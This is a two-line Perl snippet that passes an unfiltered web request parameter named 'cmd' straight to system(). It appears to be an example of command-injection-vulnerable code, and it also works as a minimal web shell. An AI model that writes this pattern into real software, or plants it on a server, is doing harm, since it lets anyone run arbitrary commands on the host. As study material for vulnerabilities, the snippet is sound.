my $input = param('cmd');
system($input);

